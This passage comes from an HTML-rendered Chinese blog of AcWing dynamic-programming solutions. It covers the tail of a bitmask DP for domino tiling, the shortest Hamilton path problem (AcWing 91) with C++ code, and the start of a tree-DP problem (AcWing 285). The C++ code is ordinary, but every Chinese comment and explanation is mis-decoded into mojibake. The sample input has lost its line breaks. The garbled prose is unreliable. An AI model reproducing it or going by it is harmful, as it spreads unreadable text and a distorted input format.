class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span>  <span class="comment">// memset()åœ¨Cä¸­åœ¨&lt;string.h&gt;ï¼ŒC++ä¸­åœ¨&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">12</span>, kM = <span class="number">1</span> &lt;&lt; kN;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> st[kM];  <span class="comment">// st[j]: åœ¨nè¡Œæ—¶, çŠ¶æ€jæ˜¯å¦åˆæ³•</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; states[kM];  <span class="comment">// states[j]: å“ªäº›çŠ¶æ€kå¯ä»¥è½¬ç§»åˆ°çŠ¶æ€j</span></span><br><span class="line"><span class="comment">// vector&lt;vector&lt;int&gt;&gt; states(kN); ä¸ä¸Šä¸€å¥ç­‰ä»·</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> f[kN][kM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m), n || m) &#123;</span><br><span class="line">    <span class="comment">// é¢„å¤„ç†1: å¯¹äºæ¯ç§çŠ¶æ€ï¼Œå…ˆé¢„å¤„ç†æ¯åˆ—ä¸èƒ½æœ‰å¥‡æ•°ä¸ªè¿ç»­çš„0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">      st[i] = <span class="literal">true</span>;</span><br><span class="line">      <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;&gt; j &amp; <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (cnt &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// st[i] = false;</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// cnt = 0;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (cnt &amp; <span class="number">1</span>) st[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// é¢„å¤„ç†2: æ±‚åˆ°çŠ¶æ€jçš„æ‰€æœ‰åˆæ³•çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">1</span> &lt;&lt; n); j++) &#123;</span><br><span class="line">      states[j].<span class="built_in">clear</span>();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; (<span class="number">1</span> &lt;&lt; n); k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((j &amp; k) == <span class="number">0</span> &amp;&amp; st[j | k]) &#123;  <span class="comment">// ==è¾ƒ&amp;ä¼˜å…ˆ</span></span><br><span class="line">          states[j].<span class="built_in">push_back</span>(k);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="keyword">sizeof</span> f);</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;  <span class="comment">// ?</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">1</span> &lt;&lt; n); j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> k: states[j]) &#123;</span><br><span class="line">          f[i][j] += f[i - <span class="number">1</span>][k];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, f[m][<span class="number">0</span>]);  <span class="comment">// æ‰“å°ç”¨%lld</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-91-æœ€çŸ­Hamiltonè·¯å¾„"><a href="https://www.acwing.com/activity/content/problem/content/1011/">AcWing 91. æœ€çŸ­Hamiltonè·¯å¾„</a></h2><p><code>éš¾åº¦ï¼šä¸­ç­‰</code></p><p>ç»™å®šä¸€å¼  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªç‚¹çš„å¸¦æƒæ— å‘å›¾ï¼Œç‚¹ä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> æ ‡å·ï¼Œæ±‚èµ·ç‚¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> åˆ°ç»ˆç‚¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„æœ€çŸ­ Hamilton è·¯å¾„ã€‚</p><p>Hamilton è·¯å¾„çš„å®šä¹‰æ˜¯ä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> ä¸é‡ä¸æ¼åœ°ç»è¿‡æ¯ä¸ªç‚¹æ°å¥½ä¸€æ¬¡ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œè¾“å…¥æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œæ¯è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œå…¶ä¸­ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> è¡Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> ä¸ªæ•´æ•°è¡¨ç¤ºç‚¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span> çš„è·ç¦»ï¼ˆè®°ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[i,j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span></span>ï¼‰ã€‚</p><p>å¯¹äºä»»æ„çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x,y,z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>ï¼Œæ•°æ®ä¿è¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0</mn><mtext>ï¼Œ</mtext><mi>a</mi><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>a</mi><mo stretchy="false">[</mo><mi>y</mi><mo separator="true">,</mo><mi>x</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[x,x]=0ï¼Œa[x,y]=a[y,x]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mclose">]</span></span></span></span> å¹¶ä¸” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">]</mo><mo>+</mo><mi>a</mi><mo stretchy="false">[</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo stretchy="false">]</mo><mo>â‰¥</mo><mi>a</mi><mo stretchy="false">[</mo><mi>x</mi><mo separator="true">,</mo><mi>z</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[x,y]+a[y,z] \ge a[x,z]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€çŸ­ Hamilton è·¯å¾„çš„é•¿åº¦ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><mi>a</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>7</mn></msup></mrow><annotation encoding="application/x-tex">0 \le a[i,j] \le 10^7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>50 2 4 5 12 0 6 5 34 6 0 8 35 5 8 0 51 3 3 5 0</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>18</code></pre><h3 id="çŠ¶æ€å‹ç¼©dp">çŠ¶æ€å‹ç¼©dp</h3><ul><li>çŠ¶æ€è¡¨ç¤º <code>f[i][j]</code><ul><li>é›†åˆ æ‰€æœ‰ä»0èµ°åˆ°j,èµ°è¿‡çš„ç‚¹é›†æ˜¯içš„æ‰€æœ‰è·¯å¾„</li><li>å±æ€§ Min</li></ul></li><li>çŠ¶æ€è®¡ç®— <code>f[i][j] = min(f[i][j], f[i - (1 &lt;&lt; j)][k] + w[k][j])</code><ul><li>æŒ‰ç…§å€’æ•°ç¬¬2æ­¥èµ°é‚£ä¸ªç‚¹è¿›è¡Œåˆ†ç±»</li><li>èµ°k <code>f[i - (1 &lt;&lt; j)][k]</code><br>ä»åˆ°jçš„é›†åˆç‚¹çš„é›†åˆ<code>i</code>ï¼Œé™¤å»jæœ¬èº«å¾—åˆ°<code>i - (1 &lt;&lt; j)</code></li></ul></li></ul><p>åˆå§‹åŒ– <code>f[1][0] = 0;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">20</span>, kM = <span class="number">1</span> &lt;&lt; kN;  <span class="comment">// kNä¸èƒ½å¼€å¤§äº†, 22å°±æŠ¥MLE</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> w[kN][kN], f[kM][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ä¸€å®šè¦åˆå§‹åŒ–</span></span><br><span class="line">  <span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> f);</span><br><span class="line">  f[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i &gt;&gt; j &amp; <span class="number">1</span>) &#123;  <span class="comment">// ç»è¿‡jçš„çŠ¶æ€æ‰æœ‰æ„ä¹‰</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;  <span class="comment">// kä¸ä¸€å®šå°äºj</span></span><br><span class="line">          <span class="keyword">if</span> ((i - (<span class="number">1</span> &lt;&lt; j)) &gt;&gt; k &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - (<span class="number">1</span> &lt;&lt; j)][k] + w[k][j]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>][n - <span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ ‘å½¢DP">æ ‘å½¢DP</h1><h2 id="AcWing-285-æ²¡æœ‰ä¸Šå¸çš„èˆä¼š"><a href="https://www.acwing.com/problem/content/287/">AcWing 285. æ²¡æœ‰ä¸Šå¸çš„èˆä¼š</a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>Ural å¤§å­¦æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> åèŒå‘˜ï¼Œç¼–å·ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">1 \sim N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ã€‚</p><p>ä»–ä»¬çš„å…³ç³»å°±åƒä¸€æ£µä»¥æ ¡é•¿ä¸ºæ ¹çš„æ ‘ï¼Œçˆ¶èŠ‚ç‚¹å°±æ˜¯å­èŠ‚ç‚¹çš„ç›´æ¥ä¸Šå¸ã€‚</p><p>æ¯ä¸ªèŒå‘˜æœ‰ä¸€ä¸ªå¿«ä¹æŒ‡æ•°ï¼Œç”¨æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">H\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span> ç»™å‡ºï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>i</mi><mo>â‰¤</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">1 \le i \le N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ã€‚</p><p>ç°åœ¨è¦å¬å¼€ä¸€åœºå‘¨å¹´åº†å®´ä¼šï¼Œä¸è¿‡ï¼Œæ²¡æœ‰èŒå‘˜æ„¿æ„å’Œç›´æ¥ä¸Šå¸ä¸€èµ·å‚ä¼šã€‚</p><p>åœ¨æ»¡è¶³è¿™ä¸ªæ¡ä»¶çš„å‰æä¸‹ï¼Œä¸»åŠæ–¹å¸Œæœ›é‚€è¯·ä¸€éƒ¨åˆ†èŒå‘˜å‚ä¼šï¼Œä½¿å¾—æ‰€æœ‰å‚ä¼šèŒå‘˜çš„å¿«ä¹æŒ‡æ•°æ€»å’Œæœ€å¤§ï¼Œæ±‚è¿™ä¸ªæœ€å¤§å€¼ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" 